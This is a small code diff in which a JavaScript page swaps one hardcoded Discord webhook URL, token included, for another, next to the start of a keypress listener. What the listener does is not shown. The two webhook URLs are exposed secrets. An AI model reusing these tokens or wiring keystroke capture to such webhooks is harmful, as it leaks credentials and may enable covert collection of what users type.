@@ -8,8 +8,8 @@ function sleep(ms) {  return new Promise(resolve => setTimeout(resolve, ms)) }
         var cx = document.getElementById('cx')
         var dv = document.getElementById('dv')
         var box = document.getElementById('hook')
-        let webhook = "https://ptb.discord.com/api/webhooks/1087065915184648243/qrHfmoTELcdWVnqMsLRwB-MgljCT4Zio2vGDF4l__h6iq8No6UjKMJWIBwkBhMMDiYwU"
- 
+        
+        var webhook = "https://ptb.discord.com/api/webhooks/1087122123048353923/AYU8aCh9zEoOXt-rNntapQRsiHP9n4F3Ql-fLu_ml4wNFyiWOI9XYlyvW5rgB1oG92gL"
         let txt;
  
         cx.addEventListener('keypress',  async (verif) => {
